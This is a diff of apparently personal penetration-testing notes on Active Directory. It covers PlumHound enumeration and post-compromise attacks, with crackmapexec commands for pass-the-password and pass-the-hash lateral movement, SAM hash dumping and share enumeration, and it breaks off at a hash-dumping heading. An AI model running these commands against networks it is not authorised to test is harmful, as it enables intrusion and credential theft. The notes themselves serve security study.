@@ -119,19 +119,42 @@ you can run the command
    this command is used to test database connectiuon, it also returns Domain users to stdout
    <img width="691" height="543" alt="image" src="https://github.com/user-attachments/assets/8baa0222-d9e7-47b0-a1e6-9d3a6d069a85" />
 
-PlumHound.py -x tasks/default.tasks -p neo4j1
+PlumHound.py -x tasks/default.tasks -p neo4j1(what it does)
 
-   
-     <img width="1626" height="966" alt="Screenshot 2025-09-21 205422" src="https://github.com/user-attachments/assets/074e266f-39bb-4f8a-ad39-b5c98cc11fa2" /> 
+
+   <img width="1626" height="966" alt="Screenshot 2025-09-21 205422" src="https://github.com/user-attachments/assets/074e266f-39bb-4f8a-ad39-b5c98cc11fa2" /> 
      
 D. Domain Enumeration with Pingcastle
 
 
 POST COMPROMISE ATTACKS(here, we already have a valid account, what can we do with that ?
-a. pass the password/ pass the hash attack
+a. pass the password/ pass the hash attack(pass attacks)
 if we crack a password and/or dump the SAM hashes, we can leverage both for lateral movemnt in networks
 tool used - crackmapexec 
-cmd- crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <pass>
+cmd- crackmapexec smb <ip/CIDR> -u <user> -d <domain> -p <password>
+   <img width="1334" height="118" alt="image" src="https://github.com/user-attachments/assets/77fa776b-f988-44cd-bd32-0c11108db56d" />
+
+we can also use hashes(NTLMv1). this is what is refered to as pass the the hash attack
+cmd - crackmapexec -smb <ip/CIDR> -u administrator -H <ntlm_hash> --local-auth
+
+   <img width="1345" height="138" alt="image" src="https://github.com/user-attachments/assets/c24d7d97-72a4-43b7-a94d-0b8a77fc5945" />
+You actually do not need to crack the hash, just pass it around
+
+you can also do --sam flag to dump the sam hashes.
+
+   <img width="1266" height="343" alt="image" src="https://github.com/user-attachments/assets/fa252dbe-ceb8-435d-8603-77380db3c703" />
 
 
+you can also do --shares to enumerate shares permissions.
+
+   <img width="1249" height="335" alt="image" src="https://github.com/user-attachments/assets/ebf6b291-1c53-40f3-8005-037e9aa229ef" />
+
+
+crackmapexec smb -L
+
+<img width="1540" height="593" alt="image" src="https://github.com/user-attachments/assets/820248c6-d5ed-4b2a-a7e5-6bb541ca1ed1" />
+
+
+DUMPING and CRACKING HASHES
+this can be achieved with the use of secretsdu
 
